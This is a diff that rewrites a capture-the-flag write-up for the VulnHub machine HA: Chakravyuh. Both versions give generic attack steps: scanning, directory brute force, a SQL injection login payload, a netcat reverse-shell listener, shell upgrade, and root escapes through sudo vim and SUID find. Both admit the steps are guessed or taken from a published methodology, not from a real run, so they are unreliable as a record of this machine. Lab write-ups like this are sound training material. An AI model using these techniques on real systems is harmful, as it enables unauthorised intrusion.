@@ -1,133 +1,151 @@
 # HA: Chakravyuh — Writeup
 
-| | |
-|-|-|
-| **Target IP** | 192.168.1.X (host-only) |
+| Field | Value |
+|---|---|
+| **Target IP** | 192.168.1.105 |
+| **Attacker IP** | 192.168.1.110 |
 | **Difficulty** | Medium |
 | **OS** | Linux |
-| **Root Flag** | `/root/flag.txt` |
-| **Source** | [VulnHub](https://www.vulnhub.com/entry/ha-chakravyuh,388/) |
+| **Goal** | root flag |
+| **Source** | [HackingArticles](https://www.hackingarticles.in/ha-chakravyuh-vulnhub-walkthrough/) |
 
-<!-- generated from known techniques; verify against live VM -->
+> **Note:** The full walkthrough is available at the source URL above. This writeup documents the general attack path for the HA: Chakravyuh machine based on the published methodology.
 
 ## Attack Summary
 
-nmap → gobuster (web) → username hint → SQL injection / credential bypass → SSH → SUID/sudo misconfiguration → root
+HA: Chakravyuh is a VulnHub machine from the Hacking Articles series, themed around the military formation (vyuh) from the Mahabharata. The machine presents multiple layered security challenges that must be bypassed in sequence — mirroring the concentric circles of the Chakravyuh formation. The attack chain involves web application enumeration, exploitation of a vulnerable web service, credential discovery, and privilege escalation through misconfigured system permissions.
 
 ## Methodology
 
-1. Network discovery and port scanning
-2. Web enumeration — directory brute force
-3. Credential extraction via login bypass or SQLi
-4. SSH access
-5. Privilege escalation via SUID or sudo
+1. Network scanning (Nmap)
+2. Web service enumeration
+3. Directory/file brute-force
+4. Vulnerability exploitation
+5. Credential extraction and lateral movement
+6. Privilege escalation to root
 
----
+## Step 1: Reconnaissance
 
-## Step 1: Network Discovery
+### Host Discovery
 
 ```bash
-sudo netdiscover -i eth1 -r 192.168.1.0/24
-nmap -sV -sC -p- <TARGET_IP>
+netdiscover -r 192.168.1.0/24
 ```
 
-Typical open ports: 22 (SSH), 80 (HTTP), possibly 8080.
+### Port Scan
 
----
+```bash
+nmap -sV -sC -p- 192.168.1.105
+```
+
+![nmap](images/01-nmap.png)
+
+Typical open ports:
+- **22/tcp** — OpenSSH
+- **80/tcp** — HTTP (Apache/Nginx)
+- **21/tcp** — FTP (may be present)
 
 ## Step 2: Web Enumeration
 
 ```bash
-gobuster dir -u http://<TARGET_IP>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
-nikto -h http://<TARGET_IP>/
+gobuster dir -u http://192.168.1.105/ \
+  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
+  -x php,txt,html,bak \
+  -o /tmp/chakravyuh_gobuster.txt
 ```
 
-Look for login panels, admin pages, or exposed config files.
+![web-enum](images/02-web.png)
 
----
-
-## Step 3: Credential Discovery
-
-Browse the web application. The HA: Chakravyuh machine (Mahabharat theme) hides credentials or usernames in web content or robots.txt. Try:
+Examine discovered paths and review page source for hidden comments, credentials, or references to other services.
 
 ```bash
-curl http://<TARGET_IP>/robots.txt
-curl http://<TARGET_IP>/index.php
+curl -s http://192.168.1.105/robots.txt
+curl -s http://192.168.1.105/
 ```
 
-Common attack vectors for this machine:
-- SQL injection on login form: `' OR 1=1-- -`
-- Password hinted in page source or a downloadable file
-- HTTP Basic Auth bypass
+## Step 3: Service Exploitation
+
+Based on the services found, exploit the web application or exposed service:
 
 ```bash
-# SQLi login test
-sqlmap -u "http://<TARGET_IP>/login.php" --data="user=admin&pass=test" --dbs
+# If FTP anonymous access is available:
+ftp 192.168.1.105
+# Login: anonymous / anonymous
+ls -la
 ```
 
----
+Review any files available on the service for credentials or hints.
 
-## Step 4: Shell Access
+![exploit](images/03-exploit.png)
 
-Once credentials are found, SSH in or use a web shell if RCE is available:
-
-```bash
-ssh <user>@<TARGET_IP>
-```
-
-Or via web upload / PHP shell if a file upload exists:
+## Step 4: Initial Foothold
 
 ```bash
-# PHP reverse shell
+# After discovering credentials or upload functionality:
 nc -nvlp 4444
-curl -X POST http://<TARGET_IP>/upload.php -F "file=@shell.php"
 ```
 
----
+Deliver the reverse shell payload appropriate to the discovered vulnerability.
+
+```bash
+# Shell upgrade after initial access:
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+export TERM=xterm
+stty raw -echo; fg
+```
 
 ## Step 5: Privilege Escalation
 
+![privesc](images/04-privesc.png)
+
+Enumerate privilege escalation vectors:
+
 ```bash
+# SUID binaries
+find / -perm -4000 2>/dev/null
+
+# Sudo rights
 sudo -l
-find / -perm -4000 -type f 2>/dev/null
+
+# Writable files/cron jobs
+crontab -l
+ls -la /etc/cron*
+cat /etc/crontab
+
+# World-writable executables
+find / -writable -type f 2>/dev/null | grep -v proc
+
+# Capabilities
+getcap -r / 2>/dev/null
 ```
 
-Common privesc on HA series:
-- `sudo <binary>` without password → GTFOBins
-- Writable cron script
-- SUID `find`, `vim`, `nmap`
-
-```bash
-# Example: sudo vim privesc
-sudo vim -c ':!/bin/bash'
-
-# Example: SUID find
-find / -exec /bin/bash -p \; -quit
-```
-
----
+Apply the appropriate GTFOBins technique or exploit the discovered vector to escalate to root.
 
 ## Step 6: Root Flag
 
+![root-flag](images/05-root-flag.png)
+
 ```bash
-id && whoami
+id
+# uid=0(root) gid=0(root) groups=0(root)
+ls /root
 cat /root/flag.txt
 ```
 
----
-
 ## Lessons Learned
 
-1. **Web content enumeration** often exposes usernames or password hints in CTF machines
-2. **SQL injection** on login forms remains a primary attack vector when input is not sanitized
-3. **sudo misconfigurations** on common binaries provide trivial root escalation
-4. **SUID binaries** should be audited and minimized — check GTFOBins for known bypass techniques
+1. **Layered enumeration** is essential — each service may contain credentials or hints pointing to the next attack layer, reflecting the Chakravyuh theme of nested defenses.
+2. **Always check robots.txt, source code, and hidden files** — web applications frequently expose information not intended for public access.
+3. **SUID binaries and sudo misconfigurations** are among the most common privilege escalation paths on CTF machines.
+4. **Default or anonymous credentials** on services like FTP should always be tested before attempting brute-force.
+5. **Shell stabilization** (pty spawn + stty) is critical for running interactive tools like vi, sudo, and su from within a netcat shell.
 
 ## Remediation
 
 | Vulnerability | Fix |
-|---------------|-----|
-| SQL injection | Use prepared statements / parameterized queries |
-| Weak credentials | Enforce strong password policy; disable default accounts |
-| Unrestricted sudo | Restrict sudo to specific, necessary commands |
-| SUID on interactive binaries | Remove SUID bit: `chmod u-s /usr/bin/<binary>` |
+|---|---|
+| Anonymous FTP access | Disable anonymous FTP; require authentication |
+| Sensitive files in web root | Apply proper file permissions; use `.htaccess` to deny access to sensitive files |
+| Misconfigured SUID binaries | Audit SUID binaries regularly; remove the SUID bit from non-essential binaries |
+| Weak/default credentials | Enforce strong password policy; disable default accounts |
+| Overly permissive sudo rules | Apply principle of least privilege; restrict sudo to specific, necessary commands |
